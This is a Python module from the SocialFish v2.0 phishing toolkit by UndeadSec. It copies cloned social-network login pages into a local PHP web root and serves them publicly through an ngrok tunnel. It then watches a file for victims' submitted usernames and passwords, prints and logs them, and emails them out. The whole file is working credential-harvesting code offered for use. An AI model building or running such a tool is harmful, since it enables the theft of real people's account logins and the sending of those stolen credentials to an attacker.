######################################################
#                                                    #
#       SOCIALFISH v2.0                              #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################

from os import system
from time import sleep
from huepy import *
from subprocess import getoutput
from core.email import send_mail
from core.credentials import credentials
from smtplib import SMTPSenderRefused, SMTPServerDisconnected
from time import strftime

def runPhishing(social, custom):
    global _social
    _social = social
    system('rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')   
    command = 'cp base/WebPages/%s/*.* base/Server/www/' % social.lower()
    system(command)
    with open('base/Server/www/login.php') as f:
        read_data = f.read()   
    c = read_data.replace('<CUST0M>', custom)
    f = open('base/Server/www/login.php', 'w')
    f.write(c)
    f.close()

def waitCreds():
    print(cyan(" [*] Waiting for credentials... "))
    while True:
        with open('base/Server/www/cat.txt') as creds:
            lines = creds.read().rstrip()
        if len(lines) != 0:
            print(green('\n [*] Credentials found:\n %s' % lines))
            system('rm -rf base/Server/www/cat.txt && touch base/Server/www/cat.txt')
            try:
                credentials(lines.split('\n'), _social)
                send_mail(lines.split('\n'),_social)
            except NameError:
                pass         
            except SMTPSenderRefused:
                print(red(' [!] Sorry, sender refused :('))
                pass
            except SMTPServerDisconnected:
                pass

def runNgrok():
    system('./base/Server/ngrok http 1449 > /dev/null &')
    ngrok_url = ''
    check = 'curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh'
    sleep(5)
    while ngrok_url == '':
        ngrok_url = getoutput(check)
    print(lightgreen('\n [*] Ngrok URL: %s' % ngrok_url))
    print(green(' [*] Your logs are being stored in: Logs/{}').format(_social + strftime('-%y%m%d.txt')))
    print(yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit'))

def runServer():
    system("cd base/Server/www/ && php -n -S 127.0.0.1:1449 > /dev/null 2>&1 &")
